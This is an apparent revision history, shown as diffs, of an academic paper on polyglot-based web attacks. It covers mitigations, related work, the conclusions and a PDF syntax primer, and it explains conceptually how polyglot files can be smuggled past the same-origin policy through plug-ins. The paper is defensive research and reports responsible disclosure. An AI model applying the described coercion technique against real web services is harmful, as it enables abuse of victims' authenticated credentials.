+There are limitations to this technique; If a context has multiple possible types, e.g., an image-tag, 
+a polyglot between two of the types can evade detection. The specific cases where this situation 
+occurs in an exploitable way are rare, and further work can help in determining and mitigating such 
+vulnerabilities.
+
+\subsection{Specific approaches}
+
+Apart from the general approach described above, there are mitigation approaches 
+that are specific to each of the components involved. These are recommended to 
+be used until general approaches for mitigating polyglot attacks are widely adopted.
+
+\subsubsection{Server-side mitigation}
+
+As a content provider on the Internet today there are precautions that one can 
+take to mitigate this class of vulnerabilities. Which precautions to take depend 
+on the kind of services provided. The mitigation recommendations for syntax 
+injection apply to all services that generate content based on user input, and the content smuggling
+recommendations apply to services that serve user-supplied files.
+
+\paragraph{Syntax injection}
+
+%In the case of PDF; always encode tokens related to the PDF 
+%syntax. Generally, hard to ensure that tokens for all potential 
+%file formats are properly encoded without breaking anything.
+
+Preventing syntax injection attacks on the server-side poses severe challenges.
+Even server-side filtering of HTML syntax to prevent cross-side scripting
+attacks has proved difficult due to the many contexts in which JavaScript can be 
+introduced. Filtering all potentially harmful tokens from all formats in which a 
+document may be interpreted is hardly possible.
+
+To prevent PDF-based syntax injection attack, the task is simpler. As discussed in Section~\ref{sec:pdf-injection}, the token-set identified in 
+Section~\ref{sec:pdf-injection}, are essential 
+to create valid PDF syntax. %, namely \emph{'$<$', '$>$', and '/'}.
+Filtering 
+user input to remove or encode these characters effectively mitigates the 
+vulnerability. 
+Luckily, because of the significant overlap with the token-set
+of HTML, many of the contexts where user input can occur are already being protected.
+Special attention is required in contexts are not traditionally filtered for 
+HTML tokens, e.g. JSON.
+
+\paragraph{Content smuggling}
+\label{sec:smuggling-mitigation}
+The current best-practice recommendation from Google~\cite{Google:ContentHosting} 
+on hosting user-supplied content, is to serve the content from a sandboxed origin that is 
+completely separate, as per SOP, and isolated from the sensitive services. 
+These best-practices successfully prevents content smuggling 
+attacks, as the restrictions of the SOP prevents the content from accessing any sensitive 
+resources in the origin of the web service.
+
+These recommendations come with a caveat to be taken into consideration. Some user supplied 
+content is only meant to be accessible to certain authenticated users, e.g. photos that 
+are only shared with friends. In that case, the service needs to transfer the 
+credentials required to authenticate the user from the sensitive origin to the sandboxed 
+origin, without actually revealing the credentials used in the sensitive origin. 
+Revealing the credentials, e.g. using the same cookies on both origins, defeats 
+the purpose of the sandbox origin entirely. Currently there is no uniform solution 
+to this problem. Some common solutions are encountered: using the hashed 
+credentials of the sensitive origin; or generating public, but obscured, links 
+that are later shared manually.
+
+%\todo{Problem of transferring credentials between domains for services where the content requires authentication}
+
+%Google uses the domain name \emph{googleusercontent.com} to sandbox all the 
+%untrusted user files that their various services provide for their customers.
+
+\subsubsection{Browser}
+
+Traditionally, browser vendors have allowed the browser to override the 
+MIME-type provided by the server for compatibility reasons. This is a compromise 
+to deal with the situation that the server is confused as to what kind of content it is serving. This compromise 
+has repeatedly shown to lead to security issues. The affected browser vendors 
+can help mitigate this problem by limiting the ways content can be coerced to be 
+interpreted as a particular format.
+
+In the case of PDF-based polyglots, and other polyglots that require a plugin, the browser can intervene when there is a 
+mismatch between the content-type provided by the server and the type attribute 
+of the \emph{object} tag. The vulnerability can be mitigated by acknowledging that there is a potential security issue in 
+interpreting the supplied content in the requested format and alerting the user to this
+threat.
+
+An intuitive approach would be to for the browsers to employ similar content-sniffing
+for content rendered in plug-ins, as is already done with content native to the browser.
+However, this intuition fails to take into account that the very reason for using plug-ins 
+is that the format is unknown to the browser. 
+One may argue that the browser is as confused as the originating server as to the 
+actual format of the content, and that the issue would be best resolved by the 
+corresponding plug-in.
+
+\subsubsection{Interpreter / Plugin}
+
+As a general rule of thumb, the interpreter must at the very least alert the user if the served 
+content-type differs from the expected. A preferred alternative is to 
+not attempt to interpret the content at all. This holds true especially when 
+the served content-type is well known and radically different from that which 
+the interpreter is designed for.
+
+As for the PDF file format, the underlying design decisions have led to the 
+current parsing being very relaxed. 
+As discussed in Section~\ref{sec:pdf-based-polyglots} the PDF format is a container format; designed to 
+embed syntax from other files. 
+Even when parsing strictly according to 
+the specification, it is a simple task to create a PDF-based polyglot.
+Making the parsing more strict and enforcing many of the specified requirements 
+will make it harder to create polyglots, reducing the attack surface. 
+In accordance with this recommendation, Adobe has taken the first 
+steps to prevent PDF-based polyglots. Recent versions of the reader compares the first 
+bytes of the document against a set of known file signatures.
+While this is a step in the right direction, this kind of black listing has its drawbacks.
+The difficulty is that a number of file formats that lack a reliable 
+signatures, e.g., HTML.
+
+A different approach is restricting capabilities of the format, sticking to the 
+essential features. The more capable the format is, the more likely it is to 
+introduce security flaws. In the latest version of their reader Adobe has made 
+progress also in this respect 
+by restricting the possibilities for bidirectional communication.
+
+%1 page 
+\section{Related work}
+\label{sec:related}
+Backes et al.~\cite{Backes+:SP07} explore the power of the PostScript
+language. PostScript allows executable content and access to sensitive
+information from the environment such as the user id. This work
+demonstrates how to compromise reviewer anonymity in a peer-reviewing
+process by maliciously crafting a PostScript document.
+
+As discussed in Section~\ref{sec:cross}, 
+GIFAR~\cite{Brandis:GIFAR} is based on polyglots that combine the GIF and JAR (Java
+archive) formats. The former is used as benign and the latter as
+malicious to bypass SOP. The Java virtual machine vendors have since
+then mitigated these attacks by patching the virtual machine to be
+more conservative on the format of the executed files.
+
+PDFAR~\cite{PDFAR:09} polyglots combine the PDF and JAR formats, where
+PDF serves as benign and JAR serves as malicious. Such a polyglot is
+possible due to the liberty of the requirements on the headers of PDF
+files. Mitigation against GIFAR attacks in the Java virtual machine
+effectively applies to PDFAR attacks.
+
+Nagra~\cite{Nagra:09} demonstrates GIF/JavaScript polyglots by the
+same file being interpreted as a script and as an image and
+informally discuses possible security implications.
+
+Barth et al.~\cite{Barth+:SP09} focus on security implications of
+content sniffing by browsers. They present content-sniffing XSS
+attacks by crossbreeding HTML with other formats like PostScript. They
+show attacks on real systems like HotCRP, where an uploaded conference
+paper in the PostScript format is interpreted as malicious HTML by the
+browser. They also propose a content-sniffing algorithm that does not
+suffer that helps defending against these class of attacks while
+maintaining compatibility.
+
+Sundareswaran and
+Squicciarini~\cite{Sundareswaran:Squicciarini:CEAS10,Sundareswaran:Squicciarini:SecureComm10} discuss image
+repurposing for GIFAR attacks. They present the AntiGifar tool for
+client-side protection. AntiGifar models the benign behavior of a user
+by a control-flow graph and detects possible anomalies when the
+interactions of the user and browser with the web site deviate from
+the control-flow model.
+
+As mentioned in Section~\ref{sec:cross}, Huang et
+al.~\cite{Huang+:CCS10} study an HTML/CSS attack. This attack injects
+fragments of CSS syntax in a HTML document, thereby making it a
+HTML/CSS polyglot. The error-tolerant parsing of style sheets allow
+the polyglot to parsed as valid CSS. The capabilities of CSS provide
+trivial cross-origin leakage. As discussed earlier, the paper's
+defense technique has been adopted by all major browsers, which
+implies that the attacks outlined in their paper are now ineffective.
+
+Wolf's OMG WTF PDF presentation~\cite{Wolf:CCC10} is one of the 
+inspirations for our work. The presentation explores the liberty
+of the PDF format. In addition, it highlights that PDF interpreters
+often disregard the specification demands. This is particularly
+relevant as it allows crossbreeding PDF with such
+formats as ZIP and EXE.
+
+Heiderich et al.~\cite{Heiderich+:CCS11} explore the Scalable Vector
+Graphics (SVG) format. They discover attacks that allow SVG files,
+embedded via the \emph{img} tag, to run arbitrary JavaScript. 
+One of the
+attack vectors involves an SVG/HTML polyglot
+that behaves differently depending on the context in which it is
+accessed. When included in the \emph{img} tag, the file is interpreted as SVG,
+whereas when it is accessed directly it is interpreted as malicious HTML.
+
+%1 page 
+\section{Conclusions}
+\label{sec:conc}
+We have put a spotlight on a new breed of attacks that smuggle
+malicious payload formatted as benign content. We have identified
+polyglots as the root cause for this class of attacks. In a systematic
+study, we have characterized the necessary ingredients for
+polyglot-based attacks on the web and arrive at the PDF format to be
+particularly dangerous. Our empirical studies in the web setting
+confirm vulnerabilities in the current content filters both in the
+server side and in browsers, as well as in the PDF interpreters.
+These vulnerabilities open up for insecure communication across
+Internet origins and allow attacking web sites from the top 100 Alexa
+list. To mitigate the attacks, we suggest general measures against
+polyglot-based attacks.  These measures are a combination of
+protection on the server side, in browsers, and in content
+interpreters such as PDF readers.
+
+The affected vendors have been made aware of the
+vulnerabilities. These vendors include Adobe (notified instantly after
+discovering the security implications of polyglot PDFs)
+%in late 2009
+and the major browser vendors. We have also contacted the vulnerable
+web sites from the top 100 Alexa list.
+%
+Following responsible disclosure, we refrain from providing the names of the vulnerable web sites.
+
+Future work includes identification of further formats vulnerable to
+polyglot-based attacks. Versatile media content formats such as the
+Windows Media Video format are of particular concern because of their
+potential for executing scripts. Further investigation of the PDF
+format might lead to enhanced possibilities to bypass content filters
+by alternative character sets.
+
+% We also plan to extend the empirical study to popular services like
+% HotCRP, Europass CV, and arXiv.org that allow uploading PDF
+% documents. Authorization is pending for an in-depth security study of
+% a major conference management system.
+
+%1-2 pages 
+\bibliographystyle{plain}
+\bibliography{literature}
 

### 2013-08-11 rebuttal.txt
no message

@@
 
-Evaluation of mobile browsers would indeed make an interesting addition, and certainly one
-we would like to delve into further.
+Evaluation of mobile browsers would indeed make an interesting topic for future work.
 
@@
 follow the suggestion to update the visualization with a more professional appearance, to
-move the listings to their appropriate positions and generally clarify the exposition
+move the listings to their appropriate positions and generally clarify the exposition,
 where appropriate.

### 2013-08-11 main.tex

@@
 An attacker can use a polyglot to infiltrate a vulnerable origin.
-Once infiltrated, the polyglot is embedded in the attackers web site using a plug-in.
+Once infiltrated, the polyglot is embedded from within the attacker's web site,
+so that the polyglot is loaded in the browser's plug-in.
 According to the SOP, content loaded in a plug-in is considered to belong to the 

### 2013-08-25 main.tex
Minor edit
Fixed some todos, still missing images.

@@
-\documentclass{sig-alternate}
+\documentclass{sig-alternate-2013}
 %\documentclass[10pt, conference, compsocconf]{IEEEtran}
@@
 \usepackage{epsfig,endnotes}
+
+%%%%%%%%%%%%%%%%
+% ACM Copyright text
+% Check if this is the correct version
+%%%%%%%%%%%%%%%%
+\newfont{\mycrnotice}{ptmr8t at 7pt}
+\newfont{\myconfname}{ptmri8t at 7pt}
+\let\crnotice\mycrnotice%
+\let\confname\myconfname%
+
+\permission{Permission to make digital or hard copies of all or part of this work for personal or classroom use is granted without fee provided that copies are not made or distributed for profit or commercial advantage and that copies bear this notice and the full citation on the first page.
+Copyrights for components of this work owned by others than ACM must be honored.
+Abstracting with credit is permitted.
+To copy otherwise, or republish, to post on servers or to redistribute to lists, requires prior specific permission and/or a fee.
+Request permissions from permissions@acm.org.}
+\conferenceinfo{CCS'13,}{November 4--8, 2013, Berlin, Germany.}
+\copyrightetc{Copyright 2013 ACM \the\acmcopyr}
+\crdata{978-1-4503-2477-9/13/11\ ...\$15.00.\\
+http://--enter the whole DOI string from rightsreview form confirmation}
+
+\clubpenalty=10000 
+\widowpenalty = 10000
 
@@
 
-\makeatletter
-\def\@maketitle{\newpage
- \null
- \setbox\@acmtitlebox\vbox{%
-\baselineskip 20pt
-%\vskip 2em                   % Vertical space above title.
-%\vskip 0em                   % Vertical space above title.
-   \begin{center}
-    {\ttlfnt \@title\par}       % Title set in 18pt Helvetica (Arial) bold size.
-%    \vskip 1.5em                % Vertical space after title.
-%This should be the subtitle.
-{\subttlfnt \the\subtitletext\par}\vskip 1.25em%\fi
-    {\baselineskip 16pt\aufnt   % each author set in \12 pt Arial, in a
-     \lineskip .5em             % tabular environment
-     \begin{tabular}[t]{c}\@author
-     \end{tabular}\par}
- %   \vskip 1.5em               % Vertical space after author.
-   \end{center}}
- \dimen0=\ht\@acmtitlebox
-% \advance\dimen0 by -12.75pc\relax % comment by Marco Daniel
- \unvbox\@acmtitlebox
- \ifdim\dimen0<0.0pt\relax\vskip-\dimen0\fi}
-\makeatother
+%\makeatletter
+%\def\@maketitle{\newpage
+% \null
+% \setbox\@acmtitlebox\vbox{%
+%\baselineskip 20pt
+%%\vskip 2em                   % Vertical space above title.
+%%\vskip 0em                   % Vertical space above title.
+%   \begin{center}
+%    {\ttlfnt \@title\par}       % Title set in 18pt Helvetica (Arial) bold size.
+%%    \vskip 1.5em                % Vertical space after title.
+%%This should be the subtitle.
+%{\subttlfnt \the\subtitletext\par}\vskip 1.25em%\fi
+%    {\baselineskip 16pt\aufnt   % each author set in \12 pt Arial, in a
+%     \lineskip .5em             % tabular environment
+%     \begin{tabular}[t]{c}\@author
+%     \end{tabular}\par}
+% %   \vskip 1.5em               % Vertical space after author.
+%   \end{center}}
+% \dimen0=\ht\@acmtitlebox
+%% \advance\dimen0 by -12.75pc\relax % comment by Marco Daniel
+% \unvbox\@acmtitlebox
+% \ifdim\dimen0<0.0pt\relax\vskip-\dimen0\fi}
+%\makeatother
 
@@
 
-%\author{}
-% \author{\IEEEauthorblockN{Jonas Magazinius} 
-% \IEEEauthorblockA{Department ofComputer Science\\ 
-% Chalmers University of Technology\\ 
-% Gothenburg, Sweden\\
-% jonas.magazinius@chalmers.se} 
-% \and 
-% \IEEEauthorblockN{Billy Rios} 
-% \IEEEauthorblockA{dept. name of organization\\ 
-% name of organization, acronyms acceptable\\ 
-% City, United States of America\\ 
-% Email: name@xyz.com} 
-% \and 
-% \IEEEauthorblockN{Andrei Sabelfeld} 
-% \IEEEauthorblockA{Department of Computer Science\\ 
-% Chalmers University of Technology\\ 
-% Gothenburg, Sweden\\ 
-% andrei@chalmers.se} 
-% }
+\numberofauthors{3}
+\author{\alignauthor
+Jonas Magazinius\\
+\affaddr{Department of Computer Science}\\
+\affaddr{Chalmers University of Technology}\\
+\affaddr{Gothenburg, Sweden}\\
+\email{jonas.magazinius@chalmers.se}
+\alignauthor 
+Billy K. Rios\\
+\affaddr{Cylance, Inc.}\\ 
+\affaddr{Irvine, United States of America}\\ 
+\email{billy.rios@gmail.com} 
+\alignauthor
+Andrei Sabelfeld\\
+\affaddr{Department of Computer Science}\\ 
+\affaddr{Chalmers University of Technology}\\ 
+\affaddr{Gothenburg, Sweden}\\ 
+\email{andrei@chalmers.se} 
+}
 
@@
 
-% \begin{IEEEkeywords}
-% Web Security; Polyglot; Injection; Cross-domain.
-% \end{IEEEkeywords}
+\category{H.4}{Information Systems Applications}{Miscellaneous}
+
+\keywords{Web Security, Polyglot, Injection, Cross-domain}
 
@@
 multiple interpretation of the content, providing a new space of attack vectors.
-An attacker can use a polyglot to infiltrate a vulnerable origin.
+An attacker can use a malicious polyglot to infiltrate a vulnerable origin.
 Once infiltrated, the polyglot is embedded from within the attacker's web site,
-so that the polyglot is loaded in the browser's plug-in.
+such that the browser is coerced to interpret the polyglot in an unexpected context, e.g., a plug-in.
 According to the SOP, content loaded in a plug-in is considered to belong to the 
-origin from which the content was requested, thus allowing the polyglot to communicate with the vulnerable 
-origin. A victim visiting the attacker's web site, while authenticated in the vulnerable
-origin, will activate the malicious polyglot, which can abuse the credentials of the victim 
+origin from which the content was requested. Thus, the polyglot is allowed to communicate with the vulnerable 
+origin. A victim, authenticated in the vulnerable origin, who visits the attacker's web site
+will trigger the malicious polyglot. This allows the polyglot to abuse the credentials of the victim 
 in its communication with the vulnerable service. The scenario is explained in detail in Section~\ref{sec:vectors},
@@
 By crossing origins we mean being able to request and access content
-which is normally restricted under the same-origin policy. 
+across domains, which is normally restricted under the same-origin policy. 
 Recall that SOP only allows two documents accessing each others'
@@
 with the document, e.g. by adding nodes, which in turn require new content to be 
-requested. Since these requests are not restricted by SOP, this creates a side 
+requested. Since these requests are not restricted by the SOP, this creates a side 
 channel that permits cross-origin information leakage. At the same time, the including document
@@
 
-A polyglot is composed from various constructs that are either common between
-languages; or constructs that are language specific but carrying different
+A polyglot is composed by combining syntax from two different formats A and B. 
+It leverages various syntactic language constructs that are either common between
+the formats; or constructs that are language specific but carrying different
 meaning in each language. To maintain validity across languages, one must ensure
-that language specific constructs are not interpreted by other languages. This
-is often accomplished by hiding the parts of the code specific to one language,
-in parts interpreted as comments or plain text of another.
+that constructs specific to A are not interpreted in the format of B, and vice versa. This
+is often accomplished by hiding the language specific constructs,
+in segments interpreted as comments or plain text of the other format.
 
@@
 languages either have a lot of constructs in common with other languages, such
-as the C language, or are defined such that the parser ignores that which it cannot
+as the C language, or are error tolerant in that the parser ignores that which it cannot
 interpret, such as HTML. The latter allows for ample opportunity to hide
-any code specific to another language, as long as there is no overlap with the
-syntax of the first language.
+any code specific to format A, as long as there is no overlap with the
+syntax of format B.
 
@@
 
-A malicious polyglot is composed of two formats where one is benign in nature and the other
-contains a malicious payload. 
+A malicious polyglot of two formats, \emph{A} and \emph{B}, where \emph{A} is benign in 
+nature and \emph{B} contains a malicious payload, is composed as \emph{A||B}. 
 % Characteristics of a malicious polyglot
-The benign format is a widely accepted format with the capability 
-of hiding arbitrary data, e.g. an image with comment fields. The malicious 
-format has additional capabilities, such as scripting.
+he benign format, \emph{A}, is a widely accepted format with limited capabilities,
+but with the opportunity of hiding arbitrary data, e.g. an image with comment fields. The malicious 
+format, \emph{B}, has additional capabilities, e.g., execute scripts or send requests.
 % Under what circumstances can a polyglot be malicious
 This kind of polyglot can be used for malicious purposes when there is a difference between
-the expected run-time context and the actual context it is executed in. 
-In the expected context the content is interpreted as the 
-benign format. In the actual context, however, the content is coerced to be 
-interpreted as the malicious format containing the payload.
-
-Even if a verification process exists, it verifies that the content is valid 
-in the expected context. Due to the nature of the polyglot, the content is 
-verified as valid and benign, but subsequently the malicious
+the assumed run-time context, and the actual context it is executed in. 
+In the assumed context \emph{A||B}  is interpreted as the 
+benign format, \emph{A}. In the actual context, however, \emph{A||B} is coerced to be 
+interpreted as the malicious format, \emph{B}, containing the payload.
+
+Even if a verification process exists, it will verify that the content is valid 
+in the assumed context. Due to the nature of the polyglot, the content is 
+verified as valid and benign, but subsequently, in the actual context, the malicious
 content is executed.
@@
 If the content is loaded using an \emph{image} tag it will be interpreted 
-as an image, if a \emph{script} tag is used it will be interpreted as a script. Some 
-tags even let the developer decide which type to interpret the content as. 
+as an image, if a \emph{script} tag is used it will be interpreted as a script. Certain
+tags, e.g., the object-tag and embed-tag, even let the developer decide which type to interpret the content as. 
 To prevent abuse, the browsers employ content-type 
@@
 Under our generalization, previous work corresponds to
-instances. For example, we show that GIFAR attacks describe a form of content smuggling, and
-cross-origin CSS attacks describe a form of syntax injection attacks.
+instances. For example, we show that GIFAR attacks describe a form of content smuggling, Section~\ref{sec:smuggling}, and
+cross-origin CSS attacks~\cite{Huang+:CCS10} describe a form of syntax injection attacks, Section~\ref{sec:injection}.
 %
@@
 Instead,
-Section
-\ref{sec:vuln} will show practical attacks based on other formats.
+Section~\ref{sec:vuln} will show practical attacks based on other formats.
 
@@
 
-To prevent PDF-based syntax injection attack, the task is simpler. As discussed in Section~\ref{sec:pdf-injection}, the token-set identified in 
+To prevent attacks based on a specific format, e.g., a PDF-based syntax injection attack, the task is simpler. As discussed in Section~\ref{sec:pdf-injection}, the token-set identified in 
 Section~\ref{sec:pdf-injection}, are essential 

### 2013-08-26 main.tex
no message

@@
 \crdata{978-1-4503-2477-9/13/11\ ...\$15.00.\\
-http://--enter the whole DOI string from rightsreview form confirmation}
+ http://dx.doi.org/10.1145/2508859.2516685}
 
@@
 Jonas Magazinius\\
-\affaddr{Department of Computer Science}\\
+%\affaddr{Department of Computer Science}\\
 \affaddr{Chalmers University of Technology}\\
@@
 \affaddr{Cylance, Inc.}\\ 
-\affaddr{Irvine, United States of America}\\ 
-\email{billy.rios@gmail.com} 
+\affaddr{Irvine, CA, USA}\\ 
+% \email{billy.rios@gmail.com} 
 \alignauthor
 Andrei Sabelfeld\\
-\affaddr{Department of Computer Science}\\ 
+%\affaddr{Department of Computer Science}\\ 
 \affaddr{Chalmers University of Technology}\\ 
@@
 
-\category{H.4}{Information Systems Applications}{Miscellaneous}
-
-\keywords{Web Security, Polyglot, Injection, Cross-domain}
+\category{K.6.5}{Security and Protection}{Unauthorized access}
+
+\keywords{Web Security; Polyglot; Injection; Cross-domain}
 
@@
 
+\section*{Acknowledgments}
+This work was funded by 
+the European Community under the ProSecuToR and WebSand projects
+and
+the Swedish research agencies SSF and VR.
+
 %1-2 pages 

### 2013-08-26 main.tex
no message

@@
 % 
-This paper identifies the root cause of a large class of attacks: \emph{polyglots}. 
+This paper focuses on the root cause of a large class of attacks: \emph{polyglots}. 
 A polyglot is a program that is valid in multiple programming languages. Polyglots allow
@@
 \paragraph{Crossing origins by crossing formats}
-This paper identifies a new breed of attacks and its root cause:
+This paper focuses on a new breed of attacks and its root cause:
 \emph{polyglots}. 
@@
 \paragraph{Generalizing polyglot attacks} 
-The paper is the first to perform a generalization and systematic study of polyglot
+The paper is the first to present a generalized description of polyglot
 attacks.
@@
 %3 pages
-\section{Crossing origins by crossing formats}
+\section{Crossing origins and formats}
 \label{sec:cross}
@@
 This section describes how formats can be crossed and how that can be abused 
-to cross origins by circumventing the same-origin policy. We begin by 
-describing cross-origin information leaks, next we
-generalize the problem of crossing formats to \emph{polyglots} and describe the  
+to cross origins by circumventing the same-origin policy. We
+describe cross-origin information leaks,
+generalize the problem of crossing formats to \emph{polyglots}, and present the  
 characteristics of a malicious polyglot. From that we derive two attack vectors and 
@@
 measures. Section~\ref{sec:eval} shows that even state-of-the-art plug-ins fail to 
-properly do so, emphasizing the importance of increasing awareness on the issue. 
+properly do so, emphasizing the importance of the issue. 
 %Next we show how crossing formats
@@
 as a different type can be accommodated in the context of the web. 
-If the content is loaded using an \emph{image} tag it will be interpreted 
+If the content is loaded using an \emph{img} tag it will be interpreted 
 as an image, if a \emph{script} tag is used it will be interpreted as a script. Certain
-tags, e.g., the object-tag and embed-tag, even let the developer decide which type to interpret the content as. 
+tags, e.g., the \emph{object} tag and \emph{embed} tag, even let the developer decide which type to interpret the content as. 
 To prevent abuse, the browsers employ content-type 
 sniffing for certain content-types, a practice which has historically led to 
-security issues. 
+security issues, as illustrated below.
 %
@@
 describe how an attacker can create a 
-\emph{chameleon} document, that is valid PostScript, but will be identified as HTML.
+chameleon document, that is valid PostScript, but will be identified as HTML.
 This issue allows exploitation when there is a mismatch between a web site's 
-content validation filter and the browsers content-sniffing algorithm.
+content validation filter and the browser's content-sniffing algorithm.
 
@@
 %
-The added value of our paper is a generalized view and focus on new
+The added value of our paper is a generalized view on polyglot attacks and focus on new
 instances of polyglots that involve the PDF format.
@@
 
-This paper identifies two vectors for infiltrating an origin, either via syntax 
+This paper describes two vectors for infiltrating an origin, either via syntax 
 injection, or content smuggling. In the case of syntax injection, existing content is manipulated
@@
 
-Not only in-line JavaScript fall short in this regard. JavaScript object notation 
+Note that not only in-line JavaScript falls short in this regard. JavaScript object notation 
 (JSON) is used in modern web sites as a data transport. This is particularly 
@@
 it seems to only support embedding of PDF documents using the \emph{embed} tag. 
-This is not a major obstacle in exploiting the vulnerability, as the embed and 
-object tags are interchangeable in this respect.
+This is not a major obstacle in exploiting the vulnerability, as the \emph{embed} and 
+\emph{object} tags are interchangeable in this respect.
 
@@
 
-Note that although some of the mitigation suggestions discussed below are already in place
-(notably as implemented by the Chrome builtin PDF reader), the state of the art
+Although some of the mitigation suggestions below are already in place
+(e.g., the Chrome builtin PDF reader), the state of the art
 is far from being satisfactory. As our paper demonstrates, the
@@
 %
-As an example, when content is loaded in an object-tag with a type attribute, as 
+As an example, when content is loaded in an \emph{object} tag with a type attribute, as 
 is the case throughout the paper, the browser already
@@
 
-There are limitations to this technique; If a context has multiple possible types, e.g., an image-tag, 
+There are limitations to this technique; If a context has multiple
+possible types, e.g., an \emph{img} tag, 
 a polyglot between two of the types can evade detection. The specific cases where this situation 
@@
 
-Preventing syntax injection attacks on the server-side poses severe challenges.
+Preventing syntax injection on the server-side poses severe challenges.
 Even server-side filtering of HTML syntax to prevent cross-side scripting
@@
 \label{sec:related}
+Recall that the added value of our paper is a generalized account of polyglot attacks and focus on new
+instances of polyglots that involve the PDF format. We briefly report
+on related instances of polyglot attacks.
+
 Backes et al.~\cite{Backes+:SP07} explore the power of the PostScript
@@
 
-Barth et al.~\cite{Barth+:SP09} focus on security implications of
+Barth et al.~\cite{Barth+:SP09} investigate the security implications of
 content sniffing by browsers. They present content-sniffing XSS
 attacks by crossbreeding HTML with other formats like PostScript. They
-show attacks on real systems like HotCRP, where an uploaded conference
-paper in the PostScript format is interpreted as malicious HTML by the
-browser. They also propose a content-sniffing algorithm that does not
-suffer that helps defending against these class of attacks while
+show attacks on real systems like HotCRP, where an uploaded document
+in the PostScript format is interpreted as malicious HTML by the
+browser. They also propose a content-sniffing algorithm
+that helps defending against this class of attacks while
 maintaining compatibility.

### 2013-08-26 main.tex
Fixed images, bad breaks and overflows

@@
 
+\vfill\eject
 \paragraph{Overview}
@@
   \center
-  \includegraphics[width=0.49\textwidth]{scenario.png}
+  \includegraphics[width=0.49\textwidth]{scenario.pdf}
   \caption{Overview of the scenario}
@@
   \center
-  \includegraphics[width=0.49\textwidth]{injection-scenario.png}
+  \includegraphics[width=0.49\textwidth]{injection-scenario.pdf}
   \caption{Syntax injection scenario}
@@
 \paragraph{Scenario}
-The content smuggling scenario proceeds as illustrated in Figure~\ref{fig:smuggling-scenario}.
+The content smuggling scenario proceeds as illustrated in Figure~\ref{fig:scenario}.
 Similarly to the previous scenarios, the victim is an authenticated user of a targeted vulnerable web site, \emph{vulnerable.com}. 
@@
 
-\begin{figure}[t]
-  \center
-  \includegraphics[width=0.49\textwidth]{smuggling-scenario.png}
-  \caption{Content smuggling scenario}
-  \label{fig:smuggling-scenario}
-\end{figure}
+%\begin{figure}[t]
+%  \center
+%  \includegraphics[width=0.49\textwidth]{smuggling-scenario.png}
+%  \caption{Content smuggling scenario}
+%  \label{fig:smuggling-scenario}
+%\end{figure}
 
@@
 header.
-
-% objects
-\subsubsection{Objects}
-Objects can be direct or indirect, the difference being that an indirect object 
-has labels which are used for referring to the object from another object. Object 
-labels are numbered and begin with the string "\emph{N n} obj", where "N" is the object number and "n" is the 
-revision number. Similarly object references are of the form "\emph{N n} R".
-The label is optionally ended with the keyword "endobj".
-
-There are eight basic types of basic objects; booleans, integers, strings, names, 
-arrays, dictionaries, streams and the null object. For the intents and purposes 
-of this article, we will focus on the string, dictionary, name and stream objects.
-
-% string objects
-\paragraph{String objects}
-There are two types of strings; literal and hexadecimal. Literal strings are 
-enclosed by the "(" and ")" characters. Any character can occur in a literal 
-string, even parentheses if they are balanced, e.g. a matching closing 
-parenthesis for every opened parenthesis. In hexadecimal strings 
-each character is represented by its corresponding hexadecimal value, enclosed 
-by the "$<$" and "$>$" characters.
-
-% dictionary objects
-\paragraph{Dictionary objects}
-Dictionary objects are a name-value map delimited by the "$<<$" and "$>>$" 
-tokens. The names are name objects and the values are objects of any type.
-% name objects
-Name objects begin with the "/" character, followed by a string of non-whitespace 
-characters. Each dictionary has a type, either specified by the "/Type" name or inferred 
-from the context in which it occurs. The type declares which kind of element the 
-dictionary is describing, e.g. a page or an annotation. Dictionaries form the structure of the document by connecting
-objects through references, e.g. relating a page to its contents. %At least one 
-%dictionary is required to build a PDF document. 
-% actions?
-A special type of dictionary describes \emph{actions}. Actions are triggered when a
-certain event occur, such as a file is opened or a page is displayed, and the action 
-dictionary specify how it is handled. Actions can be used to, among other 
-things, go to a specific page, play a sound, execute JavaScript or launch a command.
-
-% stream objects
-\paragraph{Stream objects}
-A stream is an unlimited sequence of bytes. A stream object is indirect and consists of a 
-dictionary, describing the stream, and the associated stream delimited by the 
-"stream" and "endstream" keywords. 
-%
-According to the specification, the stream dictionary shall contain a \emph{Length} 
-name to specify the length of the stream. In practice this can be omitted as 
-long as the delimiting keywords are in place.
-%
-PDF supports encoding of streams, in which
-case the dictionary describe which filters are required to decode the stream.
-
-% cross-reference
-\subsubsection{Cross-reference}
-The cross-reference section is a record of the location of indirect objects 
-within a file. The location is specified as the byte offset from the beginning 
-of the file. The cross-reference section is opened with the "xref" keyword,
-followed by one record for each indirect object. The cross-reference section 
-will be reconstructed if missing and can therefore be omitted.
-
-% trailer
-\subsubsection{Trailer}
-The trailer is composed of a trailer dictionary, a pointer to the cross-reference 
-section and an end-of-file marker. The trailer dictionary is introduced by the 
-"trailer" keyword. 
-%
-\emph{Root} is in practice the only mandatory name in the trailer dictionary, referencing the root of the 
-%
-document structure. The "startxref" keyword is followed by the number of bytes from 
-the beginning of the file to the first cross-reference section. As with the 
-cross-reference section, it can be omitted. The string "\%\%EOF" marks the 
-end-of-file, but can be omitted.
 
@@
 
+% objects
+\subsubsection{Objects}
+Objects can be direct or indirect, the difference being that an indirect object 
+has labels which are used for referring to the object from another object. Object 
+labels are numbered and begin with the string "\emph{N n} obj", where "N" is the object number and "n" is the 
+revision number. Similarly object references are of the form "\emph{N n} R".
+The label is optionally ended with the keyword "endobj".
+
+There are eight basic types of basic objects; booleans, integers, strings, names, 
+arrays, dictionaries, streams and the null object. For the intents and purposes 
+of this article, we will focus on the string, dictionary, name and stream objects.
+
+% string objects
+\paragraph{String objects}
+There are two types of strings; literal and hexadecimal. Literal strings are 
+enclosed by the "(" and ")" characters. Any character can occur in a literal 
+string, even parentheses if they are balanced, e.g. a matching closing 
+parenthesis for every opened parenthesis. In hexadecimal strings 
+each character is represented by its corresponding hexadecimal value, enclosed 
+by the "$<$" and "$>$" characters.
+
+% dictionary objects
+\paragraph{Dictionary objects}
+Dictionary objects are a name-value map delimited by the "$<<$" and "$>>$" 
+tokens. The names are name objects and the values are objects of any type.
+% name objects
+Name objects begin with the "/" character, followed by a string of non-whitespace 
+characters. Each dictionary has a type, either specified by the "/Type" name or inferred 
+from the context in which it occurs. The type declares which kind of element the 
+dictionary is describing, e.g. a page or an annotation. Dictionaries form the structure of the document by connecting
+objects through references, e.g. relating a page to its contents. %At least one 
+%dictionary is required to build a PDF document. 
+% actions?
+A special type of dictionary describes \emph{actions}. Actions are triggered when a
+certain event occur, such as a file is opened or a page is displayed, and the action 
+dictionary specify how it is handled. Actions can be used to, among other 
